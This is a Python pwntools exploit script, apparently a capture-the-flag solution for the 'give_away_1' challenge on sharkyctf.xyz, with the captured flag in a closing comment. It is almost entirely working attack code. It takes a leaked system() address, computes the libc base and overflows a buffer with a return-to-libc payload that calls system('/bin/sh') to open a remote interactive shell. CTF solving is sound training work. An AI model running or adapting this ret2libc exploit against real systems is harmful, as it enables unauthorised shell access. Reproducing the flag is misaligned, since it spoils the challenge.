from pwn import *


binpath = './give_away_1'
libcpath = './libc-2.27.so'
elf = ELF(binpath)
libc = ELF(libcpath)


context.terminal = ['tmux', 'split-w', '-h']
context.binary = elf


gdbscript = '''
gef
b vuln
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = remote('sharkyctf.xyz', 20334)


io.recvuntil(b': ')
addr_system = int(io.recvline().rstrip(), 16)
addr_libc = addr_system - libc.symbols['system']

print('addr_libc = 0x{:x}'.format(addr_libc))

payload = b''
payload += b'A' * 0x24
payload += p32(addr_system)
payload += p32(0xdeadbeef)
payload += p32(addr_libc + next(libc.search(b'/bin/sh')))

io.sendline(payload)


io.interactive()


# shkCTF{I_h0PE_U_Fl4g3d_tHat_1n_L3ss_Th4n_4_m1nuT3s}
